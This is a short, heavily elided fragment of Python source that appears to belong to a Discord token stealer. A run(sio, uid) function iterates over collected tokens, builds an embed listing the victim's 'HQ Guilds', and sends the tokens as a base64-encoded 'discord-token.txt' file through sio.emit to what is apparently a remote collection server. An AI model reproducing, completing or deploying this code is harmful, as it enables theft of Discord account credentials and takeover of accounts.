...
def run(sio, uid):
        ...
        def upload(self, raw_data):
            ...
            for token in self.tokens:
                ...
                if not raw_data:
                    ...
                    if hq_guilds != None:
                        embed.add_field(
                            name="🏰 HQ Guilds:", value=hq_guilds, inline=False
                        )
    ...
    sio.emit(
        ...
        {
            "uid": uid,
            "file_name": "discord-token.txt",
            "file": base64.b64encode(str(x).encode("utf-8")),
        },
    )
